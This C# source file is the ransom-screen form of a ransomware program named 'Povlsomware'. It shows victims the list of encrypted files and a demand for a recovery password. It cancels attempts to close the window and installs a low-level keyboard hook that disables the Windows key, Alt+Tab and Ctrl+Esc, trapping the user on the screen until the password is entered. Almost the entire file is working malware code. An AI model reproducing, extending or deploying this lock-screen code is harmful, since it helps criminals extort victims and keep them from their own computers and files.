using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Povlsomware
{
    public partial class PayM3 : Form
    {
        private bool success = false;

        public PayM3()
        {
            InitializeComponent();

            label2.Text = Program.count.ToString() + " files encrypted: ";
            listBox1.Items.AddRange(Program.encryptedFiles.ToArray());
            textBox2.Text = 
                "Your files have been encrypted! \n\r" +
                "The only way to recover them is entering the  \n\r" +
                "correct password. Coded by RakuCorp.";
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            string input = textBox1.Text;

            if (CheckPassword(input.ToCharArray()))
            {
                success = true;
                MessageBox.Show("Decrypting files...");
                backgroundWorker1.RunWorkerAsync(input);
            }
            else
            {
                textBox1.Text = string.Empty;
                ActiveControl = textBox1;
                MessageBox.Show("Wrong Password");
            }
        }

        private bool CheckPassword(char[] input)
        {
            char[] password = Program.GetPass();
            if (password.Length == input.Length)
            {
                for (int i = 0; i < input.Length; i++)
                {
                    if (password[i] != input[i])
                    {
                        return false;
                    }
                }
                return true;
            }
        return false;
        }


        private void Screen_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Block window from being closed using Alt + F4
            if (!success)
                e.Cancel = true;
        }

        private void PayM3_Load(object sender, EventArgs e)
        {
            // Make this the active window
            //WindowState = FormWindowState.Minimized;
            Show();


            // Disable WinKey, Alt+Tab, Ctrl+Esc
            // Source: https://stackoverflow.com/a/3227562
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);


        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            string input = e.Argument as string;
            Program.UndoAttack(input);

        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Application.Exit();
        }

        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Starts Here */

        // Structure contain information about low-level keyboard input event 
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input  
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);

        //Declaring Global objects     
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Disabling Windows keys 
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Ends Here */

    }

}
